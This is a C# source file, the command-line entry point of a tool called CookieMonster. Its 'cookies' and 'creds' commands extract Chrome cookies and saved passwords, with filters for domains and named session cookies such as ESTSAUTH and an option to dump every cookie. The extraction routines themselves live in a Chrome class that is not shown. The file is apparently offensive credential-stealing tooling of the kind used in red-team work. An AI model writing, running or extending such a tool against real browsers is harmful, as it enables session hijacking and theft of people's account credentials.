using System;
using System.Collections.Generic;
using CommandLine;

namespace CookieMonster
{
    class Program
    {

        [Verb("cookies", HelpText = "Extract browser cookies.")]
        class Cookies
        {
            [Option('b', "browser", Required = false, Default = "Chrome", HelpText = "Browser to target.  Example: -b Chrome")]
            public string Browser { get; set; }

            [Option('d', "domain", Required = false, Separator = ' ', Default = new string[] { "." }, HelpText = "Domain(s) to extract cookies for. Enter multiple domains using [space] as a separator.  Example: -d domain1.com domain2.com.")]
            public IList<string> Domains { get; set; }

            [Option('e', "enc", Required = false, HelpText = "Set to true to extract encrypted cookie values.  Example: -e.")]
            public bool Encrypted { get; set; }

            [Option('n', "name", Required = false, HelpText = "Extract particular cookie name(s)/key(s).  Enter multiple names using [space] as a separator.  Example: -n OhpAuth ESTSAUTH.", Separator = ',')]
            public IList<string> Names { get; set; }

            [Option('a', "all", Required = false, HelpText = "Dump ALL cookies at your peril.")]
            public bool All { get; set; }
        }

        [Verb("creds", HelpText = "Extract browser saved credentials.")]
        class Credentials
        {
            [Option('b', "browser", Required = false, Separator = ' ', Default = "Chrome", HelpText = "Browser to target.")]
            public string Browser { get; set; }
        }

        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Cookies, Credentials>(args)
                .WithParsed<Cookies>(opts =>
                {
                    string[] domains = (string[])opts.Domains;
                    bool enc = opts.Encrypted;
                    string[] names = (string[])opts.Names;
                    bool all = opts.All;
                    string browser = opts.Browser;

                    if (Array.Exists(domains, element => element == ".") && names.Length == 0 && all == false)
                    {
                        Console.WriteLine("WARNING: Neither Domain or Names are specified - this will dump ALL cookies.  If you want this, use the -a option.");
                        Environment.Exit(0);
                    }

                    if (browser == "Chrome")
                    {
                        string cookiePath = Chrome.GetCookiePath();
                        GetChromeCookies(cookiePath, domains, names, enc);
                    }

                })
                .WithParsed<Credentials>(opts =>
                {
                    string browser = opts.Browser;

                    if (browser == "Chrome")
                    {
                        string credPath = Chrome.GetCredPath();
                        GetChromeCredentials(credPath);
                    }
                });
        }

        private static void GetChromeCookies(string cookiePath, string[] domains, string[] names, bool enc)
        {
            if (names.Length > 0)
            {
                foreach (string d in domains)
                {
                    foreach (string n in names)
                    {
                        Chrome.ReadCookies(cookiePath, d, enc, n);
                    }
                }
            }
            else
            {
                foreach (string d in domains)
                {
                    Chrome.ReadCookies(cookiePath, d, enc, string.Empty);
                }
            }
        }

        private static void GetChromeCredentials(string credPath)
        {
            Chrome.ReadCredentials(credPath);
        }

    }
}

